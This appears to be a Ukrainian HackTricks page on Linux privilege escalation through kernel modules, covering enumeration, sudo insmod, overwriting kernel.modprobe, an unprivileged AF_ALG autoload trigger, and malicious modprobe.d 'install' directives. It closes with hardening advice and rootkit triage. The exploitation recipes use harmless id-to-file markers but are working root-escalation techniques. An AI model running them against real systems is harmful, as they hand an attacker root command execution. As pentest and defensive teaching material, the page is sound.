# Модулі ядра та зловживання modprobe

{{#include ../../banners/hacktricks-training.md}}

## Неправильні налаштування модулів ядра та їх завантаження

Під час перевірки Linux на можливість підвищення привілеїв підтримка модулів ядра — це критично важлива ділянка. Не вважайте кожне повідомлення про непідписаний модуль ознакою вразливості, але використовуйте його, щоб відповісти на практичні запитання.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Чи може поточний користувач завантажувати модулі через `sudo`, capabilities або шлях до доступного для запису допоміжного файлу?
- Чи ввімкнено завантаження модулів?
- Чи вимкнено примусову перевірку підпису модулів?
- Чи доступні для запису каталоги модулів, файли модулів або шляхи конфігурації `modprobe.d`?<sup>[[16]](#references)</sup>
- Чи можна читати журнали ядра, щоб підтвердити, що сталося?

Швидке первинне оцінювання починається з перевірки стану модулів, підписів, журналювання та дерева модулів.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Тлумачення:

- `modules_disabled=1` означає, що модулі не можна ні завантажувати, ні вивантажувати, а значення не можна скинути до `0` до перезавантаження.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` у командному рядку kernel або `CONFIG_MODULE_SIG_FORCE=y` вимагає, щоб модулі мали дійсний підпис; інакше можуть завантажуватися непідписані модулі, що спричинить позначення kernel як tainted.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` не накладає обмежень на `dmesg`; коли значення дорівнює `1`, для доступу потрібен `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Шляхи з правом на запис у `/lib/modules/$(uname -r)/` небезпечні, оскільки під час завантаження модулів `modprobe` шукає в цьому дереві каталогів і його даних про залежності.<sup>[[8]](#references)</sup>

### Завантаження модуля та читання виводу kernel

Якщо маєте законний дозвіл завантажити локальний модуль, `insmod` вставляє саме той файл `.ko`, який ви вказали. Функція init модуля виконується під час завантаження, а повідомлення, записані за допомогою `printk()`, потрапляють до буфера журналу kernel, який зазвичай читають за допомогою `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Мінімальний процес перевірки використовує `modinfo` для перегляду метаданих, `insmod` і `rmmod` для завантаження та видалення модуля, `lsmod` для підтвердження його завантаженого стану, а `dmesg` — для перегляду журналів kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Якщо `sudo -l` дозволяє виконувати `insmod`, `modprobe` або обгортку для них, вважайте це критичною проблемою: `sudo -l` перелічує привілеї користувача, який виконує команду, а для завантаження модуля ядра потрібна `CAP_SYS_MODULE`. Див. [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module), щоб дізнатися про способи безпосереднього використання можливостей.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod`, дозволений через Sudo

Правило Sudo, яке дозволяє користувачу запускати `insmod`, не можна порівнювати з дозволом запускати звичайний адміністративний допоміжний засіб. Код ініціалізації модуля виконується під час його завантаження, тож практичне питання під час перевірки полягає в тому, чи може цей користувач вибрати або змінити модуль, який завантажується.<sup>[[3]](#references)</sup>

Наведений нижче загальний порядок перевірки повторює перевірки кандидата на модуль: огляд, завантаження, стан, журнали та видалення.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Якщо користувач може надати довільний `.ko`, під час авторизованої оцінки це слід розглядати як повну компрометацію системи. Безпечніший підхід — не надавати можливість завантажувати модулі через sudo; якщо цього не уникнути, обмежте точний шлях, власника, дозволи, політику підписування та процедуру видалення.<sup>[[3]](#references)[[10]](#references)</sup>

Нижче наведено мінімальний вихідний код і Makefile для безпечного шаблону збирання модуля в контрольованій лабораторії; форма `make -C /lib/modules/$(uname -r)/build M=$PWD` відповідає задокументованому в ядрі процесу kbuild для зовнішніх модулів.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Збирайте та завантажуйте лише в авторизованій лабораторії; kbuild збирає зовнішній модуль, а команди завантаження/видалення викликають інтерфейси модулів ядра.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Перевірка на зловживання `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` задає допоміжну програму в userspace, яку запускає kernel для автоматичного завантаження модулів; цей sysctl впливає на автоматичне завантаження, а не на явне вставлення модулів. Якщо зловмисник може змінити його на шлях до виконуваного файла, доступного для запису, і викликати запит на завантаження модуля, цей допоміжний засіб стає шляхом до виконання коду з підвищеними привілеями. Якщо задати порожній рядок, запити на автоматичне завантаження буде вимкнено; якщо `CONFIG_STATIC_USERMODEHELPER=y`, непорожнє значення буде замінено вбудованим шляхом до статичного допоміжного засобу.<sup>[[1]](#references)</sup>

Перевірте поточний шлях до допоміжного засобу через інтерфейс kernel sysctl і перевірте власника та режим доступу цільового файла.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Перевірте, чи можна вплинути на sysctl, делеговані правила sudo або файлові capabilities.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Наведений нижче шаблон лише для лабораторного середовища змінює шлях до helper і запускає задокументований запит на автозавантаження модуля; використовуйте його лише в ізольованій системі, на роботу з якою маєте дозвіл.<sup>[[1]](#references)</sup>

У сучасних ядрах Linux не використовуйте невідомий виконуваний файл як універсальний тригер: застаріле автозавантаження модулів для спеціальних форматів виконуваних файлів було вилучено в Linux 6.14, тоді як документація ядра вказує на невідомий тип файлової системи як на шлях для запиту на автозавантаження модуля.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

На hardened системах це має завершитися помилкою, якщо дозволи забороняють непривілейований запис у `kernel.modprobe`, шлях до helper недоступний для запису або автозавантаження модулів вимкнено.<sup>[[1]](#references)</sup>

### Непривілейований тригер автозавантаження AF_ALG

Наведений вище тригер файлової системи використовує привілейовану команду `mount`.<sup>[[1]](#references)</sup> Якщо доступні сокети AF_ALG, непривілейований користувач може натомість прив’язати один із них до навмисно неіснуючого типу.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` тоді запитує `algif-<type>` через `request_module()`, що викликає налаштований helper модуля.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Це працює і після видалення в Linux 6.14 застарілого автозавантаження для невідомого формату бінарних файлів.<sup>[[11]](#references)[[17]](#references)</sup> Очікується, що `bind()` завершиться помилкою, оскільки такого типу не існує; перевірте побічний ефект helper, а не значення, повернуте сокетом.<sup>[[17]](#references)[[18]](#references)</sup>

В авторизованій лабораторії спочатку налаштуйте контрольований helper або правило `modprobe.d`, а потім запустіть один запит без `sudo` чи `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ підтримує кортеж прив’язки AF_ALG `(type, name)`.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Цей шлях потребує працездатного сокета AF_ALG і непорожнього значення `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> У ядрах із `/proc/sys/crypto/af_alg_restrict` значення `2` вимикає створення сокетів AF_ALG; значення `1` обмежує алгоритми, але не блокує запит відсутнього типу в `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> LSM може відхилити запит модуля до виклику допоміжної програми.<sup>[[19]](#references)</sup>

### Доступна для запису конфігурація `modprobe.d` і `sudo modprobe -C`

Перед пошуком модуля `modprobe` читає файли `.conf` із каталогів конфігурації, таких як `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` і `/lib/modprobe.d`, у порядку пріоритету. Файл із тією самою назвою в каталозі з вищим пріоритетом перекриває файл із каталогу з нижчим пріоритетом. Що важливіше, директива `install <module> <command>` запускає довільну команду оболонки **замість** вставлення цього модуля. Отже, доступний для запису шлях конфігурації може стати способом відкладеного виконання команд із правами облікового запису, від імені якого пізніше буде викликано `modprobe` із підвищеними привілеями; примусове використання підписів модулів ядра не автентифікує цю команду в просторі користувача.<sup>[[16]](#references)</sup>

Перевірте дозволи каталогів і файлів, а потім перегляньте ефективну конфігурацію. `modprobe -n -v` безпечний для перевірки пошуку, оскільки режим попереднього запуску не вставляє модуль і не виконує команду `install`/`remove`. Віддавайте перевагу `modprobe -c` замість застарілого варіанта написання `--showconfig`, який поточна документація kmod позначає як такий, що буде вилучений після kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Необмежене правило sudo для `modprobe` можна використати, навіть якщо перевірка підпису не дозволяє завантажувати довільні файли `.ko`: параметр `-C` задає каталог конфігурації, контрольований атакувальником, звідки процес, запущений через sudo, може виконати команду `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Якщо каталог `modprobe.d`, видимий допоміжному процесу ядра, доступний для запису, той самий [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) може негайно виконати директиву `install algif-htprobe`, не чекаючи, доки адміністратор викличе `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> В авторизованому лабораторному середовищі додайте нешкідливу команду-маркер у доступний для запису файл `.conf`, перевірте, яку директиву буде застосовано, за допомогою `modprobe -n -v algif-htprobe`, а потім запустіть тригер вище.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` і примусове застосування підписів модулів блокують завантаження модуля, але не цю команду `install` у просторі користувача; порожнє значення `kernel.modprobe` або заблокований шлях AF_ALG справді унеможливлюють цей спосіб автозавантаження.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Для пом’якшення ризику не надавайте через sudo доступ до `modprobe` з необмеженими аргументами, залишайте всі каталоги конфігурації належними root і недоступними для запису та перевіряйте неочікувані директиви `install`/`remove`. Якщо в межах довіреного адміністративного процесу потрібно обійти такі директиви для одного модуля, `modprobe --ignore-install` ігнорує їх для вказаного модуля, але залежності можуть мати власні команди.<sup>[[8]](#references)[[16]](#references)</sup>

### Перевірка доступних для запису каталогів `/lib/modules`

Доступні для запису каталоги модулів можуть дозволити підміну модулів, розміщення шкідливих модулів або зловживання автозавантаженням — залежно від того, як згодом викликається `modprobe`; під час пошуку модулів `modprobe` перевіряє `/lib/modules/$(uname -r)` і використовує дані про залежності.<sup>[[8]](#references)</sup>

Перевірте файли модулів і метадані залежностей/псевдонімів у дереві модулів активного випуску ядра, доступні для запису.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Якщо ви знайдете вміст модуля, доступний для запису, перевірте, як `modprobe` визначає залежності та як `modinfo` відображає метадані модуля.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Захисні примітки:

- Встановіть власником `/lib/modules` користувача `root:root` і забороніть запис для користувачів.<sup>[[8]](#references)</sup>
- Встановлюйте `kernel.modules_disabled=1` після завантаження системи, якщо це можливо з операційного погляду.<sup>[[1]](#references)</sup>
- Увімкніть підписування модулів у системах, яким потрібні завантажувані модулі.<sup>[[2]](#references)</sup>
- Відстежуйте записи до `/proc/sys/kernel/modprobe`, `/lib/modules` і каталогів конфігурації `modprobe.d`, а також неочікуване виконання `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Первинний аналіз rootkit на основі модуля

Шкідливий модуль може перехоплювати syscalls, представлення VFS або `/proc`, мережеві шляхи чи перевірки облікових даних, щоб приховувати процеси й файли, перенаправляти трафік або перехоплювати секрети. Він також може вилучити себе зі списку модулів, який показує `lsmod`. Закріплення може забезпечуватися псевдонімами або правилами встановлення в `modprobe.d`, каталогом `/etc/modules-load.d`, модулем systemd, вмістом initramfs або підміною легітимного файла `.ko`. Звичайний результат `lsmod` є корисним доказом, але компрометація на рівні ядра може зробити списки, надані ядром, ненадійними. Зіставляйте завантажені модулі, файли на диску, конфігурацію завантаження системи, журнали завантаження модулів і довірену зовнішню телеметрію.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Перевіряйте неочікувані назви модулів, шляхи, залежності, підписи та час завантаження. Повідомлення про taint ядра й непідписані модулі — це зачіпки, а не доказ наявності rootkit. Якщо є підозра на rootkit, збирайте докази з довіреного образу або середовища відновлення, перш ніж покладатися на дані активного ядра. На сторінці [оцінювання вразливостей ядра](kernel-vulnerability-assessment.md) розглянуто конфігурацію та ризики розкриття діагностичної інформації, зокрема tracefs і закріплені об’єкти BPF.



## References

- [1] [Документація для /proc/sys/kernel/ — Документація ядра Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Механізм підписування модулів ядра — Документація ядра Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Основи драйверів — Документація ядра Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Журналювання повідомлень за допомогою printk — Документація ядра Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Збирання зовнішніх модулів — Документація ядра Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — сторінка посібника Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Злиття тегу 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Відродження техніки modprobe_path: обхід виправлення search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [Прив’язка AF_ALG і запит модуля — вихідний код ядра Linux](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Виклик допоміжної програми модуля — вихідний код ядра Linux](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — документація Python](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — документація ядра Linux](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
